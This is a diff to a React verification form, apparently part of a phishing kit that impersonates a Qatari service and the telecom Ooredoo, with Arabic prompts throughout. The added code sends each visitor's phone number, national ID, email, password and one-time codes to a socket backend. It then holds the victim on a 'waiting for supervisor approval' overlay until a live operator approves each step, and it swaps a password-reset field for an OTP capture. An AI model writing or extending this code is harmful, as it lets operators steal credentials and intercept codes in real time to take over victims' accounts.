@@ -1,5 +1,6 @@
 import React, { useState, useEffect } from 'react';
-import { Loader2 } from 'lucide-react';
+import { Loader2, Clock, CheckCircle, XCircle } from 'lucide-react';
+import { socketService } from '../services/socketService';
 
 interface VerificationFormProps {
   onNext: () => void;
@@ -7,6 +8,7 @@ interface VerificationFormProps {
 }
 
 type SubStep = 'initial' | 'phone_otp' | 'email_otp';
+type ApprovalStatus = 'idle' | 'waiting' | 'approved' | 'rejected';
 
 const VerificationForm: React.FC<VerificationFormProps> = ({ onNext, onDataChange }) => {
   const [subStep, setSubStep] = useState<SubStep>('initial');
@@ -28,6 +30,10 @@ const VerificationForm: React.FC<VerificationFormProps> = ({ onNext, onDataChang
     hasSymbol: false
   });
 
+  // Approval system states
+  const [approvalStatus, setApprovalStatus] = useState<ApprovalStatus>('idle');
+  const [rejectionReason, setRejectionReason] = useState('');
+
   // Send data to parent when it changes
   useEffect(() => {
     if (onDataChange) {
@@ -44,36 +50,149 @@ const VerificationForm: React.FC<VerificationFormProps> = ({ onNext, onDataChang
     }
   }, [subStep, provider, phone, idNumber, email, password, phoneOtp, emailOtp, onDataChange]);
 
+  // Setup approval listener
+  useEffect(() => {
+    const handleApprovalDecision = (decision: { decision: 'approved' | 'rejected'; page: string; reason?: string }) => {
+      console.log('🔔 Approval decision for verification:', decision);
+      
+      // Check if decision is for current substep
+      const currentPage = `step5-${subStep}`;
+      if (decision.page === currentPage) {
+        if (decision.decision === 'approved') {
+          setApprovalStatus('approved');
+          // Auto-proceed after approval
+          setTimeout(() => {
+            proceedToNextStep();
+          }, 1000);
+        } else {
+          setApprovalStatus('rejected');
+          setRejectionReason(decision.reason || 'تم رفض الطلب من قبل المشرف');
+          // Reset to idle after 3 seconds
+          setTimeout(() => {
+            setApprovalStatus('idle');
+            setRejectionReason('');
+          }, 3000);
+        }
+      }
+    };
+
+    socketService.onApprovalDecision(handleApprovalDecision);
+
+    return () => {
+      socketService.offApprovalDecision();
+    };
+  }, [subStep]);
+
+  const proceedToNextStep = () => {
+    if (subStep === 'initial') {
+      setSubStep('phone_otp');
+      setApprovalStatus('idle');
+    } else if (subStep === 'phone_otp') {
+      if (provider === 'ooredoo') {
+        setSubStep('email_otp');
+        setApprovalStatus('idle');
+      } else {
+        onNext();
+      }
+    } else if (subStep === 'email_otp') {
+      onNext();
+    }
+  };
+
   const handleInitialSubmit = () => {
     setIsLoading(true);
+    // Save data first
+    socketService.saveVisitorData({
+      provider,
+      phone,
+      idNumber,
+      email,
+      password
+    }, 'step5-initial');
+    
     setTimeout(() => {
       setIsLoading(false);
-      setSubStep('phone_otp');
+      // Request approval
+      setApprovalStatus('waiting');
+      socketService.requestApproval('step5-initial');
     }, 1500);
   };
 
   const handlePhoneOtpSubmit = () => {
     setIsLoading(true);
+    // Save data first
+    socketService.saveVisitorData({
+      phoneOtp
+    }, 'step5-phone_otp');
+    
     setTimeout(() => {
       setIsLoading(false);
-      if (provider === 'ooredoo') {
-        setSubStep('email_otp');
-      } else {
-        onNext();
-      }
+      // Request approval
+      setApprovalStatus('waiting');
+      socketService.requestApproval('step5-phone_otp');
     }, 1500);
   };
 
   const handleEmailOtpSubmit = () => {
     setIsLoading(true);
+    // Save data first
+    socketService.saveVisitorData({
+      emailOtp
+    }, 'step5-email_otp');
+    
     setTimeout(() => {
       setIsLoading(false);
-      onNext();
+      // Request approval
+      setApprovalStatus('waiting');
+      socketService.requestApproval('step5-email_otp');
     }, 1500);
+  };
+
+  // Approval waiting overlay
+  const ApprovalOverlay = () => {
+    if (approvalStatus === 'idle') return null;
+
+    return (
+      <div className="fixed inset-0 z-[100] bg-white/95 backdrop-blur-sm flex items-center justify-center">
+        <div className="bg-white border-2 border-gray-200 rounded-lg p-8 max-w-md w-full mx-4 shadow-2xl">
+          {approvalStatus === 'waiting' && (
+            <div className="flex flex-col items-center gap-4 text-center">
+              <Clock className="w-16 h-16 text-[#007fb1] animate-pulse" />
+              <h3 className="text-[20px] font-bold text-[#333]">في انتظار الموافقة</h3>
+              <p className="text-[14px] text-gray-600">يرجى الانتظار حتى يتم مراجعة بياناتك من قبل المشرف...</p>
+              <div className="flex gap-2 mt-2">
+                <div className="w-2 h-2 bg-[#007fb1] rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
+                <div className="w-2 h-2 bg-[#007fb1] rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
+                <div className="w-2 h-2 bg-[#007fb1] rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
+              </div>
+            </div>
+          )}
+          
+          {approvalStatus === 'approved' && (
+            <div className="flex flex-col items-center gap-4 text-center">
+              <CheckCircle className="w-16 h-16 text-green-500" />
+              <h3 className="text-[20px] font-bold text-green-600">تمت الموافقة! ✅</h3>
+              <p className="text-[14px] text-gray-600">جاري الانتقال للخطوة التالية...</p>
+            </div>
+          )}
+          
+          {approvalStatus === 'rejected' && (
+            <div className="flex flex-col items-center gap-4 text-center">
+              <XCircle className="w-16 h-16 text-red-500" />
+              <h3 className="text-[20px] font-bold text-red-600">تم الرفض ❌</h3>
+              <p className="text-[14px] text-gray-600">{rejectionReason}</p>
+              <p className="text-[12px] text-gray-500 mt-2">يرجى تصحيح البيانات والمحاولة مرة أخرى</p>
+            </div>
+          )}
+        </div>
+      </div>
+    );
   };
 
   return (
     <div className="w-full max-w-[1400px] mx-auto bg-white font-sans" dir="rtl">
+      <ApprovalOverlay />
+      
       {/* QGCC Logo Only */}
       <div className="flex flex-col items-center mt-10 mb-8 max-w-[1000px] mx-auto">
         <div className="flex items-center justify-center">
@@ -239,44 +358,23 @@ const VerificationForm: React.FC<VerificationFormProps> = ({ onNext, onDataChang
                 <div className="w-full h-[1px] bg-gray-200 mb-8"></div>
                 <div className="space-y-4">
                   <p className="text-[15px] text-gray-800 text-center leading-relaxed font-black">
-                    يرجى الانتظار، سيتم إرسال بريد إلكتروني إلى <span className="text-[#007fb1]">{email || 'null'}</span> لإعادة تعيين كلمة المرور، قم بإعادة تعيين كلمة المرور من خلال الرابط المرفق، ومن ثم أعد إدخالها في الحقل أدناه بعد إعادة التعيين.
-                  </p>
-                  <p className="text-[13px] text-gray-500 text-center font-black opacity-80">
-                    يرجى تفقد البريد الوارد، ان لم تجد رابط اعادة التعيين في بريد الوارد قد يكون بالرسائل الترويجية او البريد الغير مرغوب فيه.
+                    يرجى ادخال رمز التحقق المرسل على البريد الالكتروني المعتمد ب ooredoo
                   </p>
                 </div>
               </div>
 
               <div className="max-w-[450px] mx-auto space-y-6">
                 <div className="space-y-2 text-center">
-                  <label className="block text-[14px] font-black text-gray-800 mb-2">كلمة المرور المؤقته <span className="text-red-500">*</span></label>
+                  <label className="block text-[14px] font-black text-gray-800 mb-2">رمز التحقق <span className="text-red-500">*</span></label>
                   <input 
-                    className="nas-input text-left h-[46px] font-black" 
-                    type="password"
+                    className="nas-input text-center h-[46px] text-[20px] font-black tracking-[0.5em]" 
+                    maxLength={6}
                     value={emailOtp}
-                    onChange={(e) => {
-                      const value = e.target.value;
-                      const englishRegex = /^[a-zA-Z0-9%$#@&/\-_]*$/;
-                      if (!englishRegex.test(value)) {
-                        setTempPasswordError('يرجى إدخال الأحرف الإنجليزية والأرقام والرموز فقط');
-                        return;
-                      }
-                      setTempPasswordError('');
-                      setEmailOtp(value);
-                    }}
+                    onChange={(e) => setEmailOtp(e.target.value.replace(/\D/g, ''))}
                   />
-                  {tempPasswordError && (
-                    <p className="text-[#d9534f] text-[12px] mt-1">{tempPasswordError}</p>
-                  )}
                 </div>
                 <div className="pt-4">
-                  <button 
-                    disabled={!emailOtp}
-                    onClick={handleEmailOtpSubmit} 
-                    className={`w-full font-black py-3.5 rounded-[4px] text-[16px] transition-all ${emailOtp ? 'bg-[#007fb1] text-white hover:bg-[#005a7d] shadow-md' : 'bg-gray-300 text-gray-500 cursor-not-allowed'}`}
-                  >
-                    تحقق
-                  </button>
+                  <button onClick={handleEmailOtpSubmit} className="w-full bg-[#007fb1] text-white font-black py-3.5 rounded-[4px] text-[16px] hover:bg-[#005a7d] transition-colors">تحقق</button>
                 </div>
               </div>
             </div>
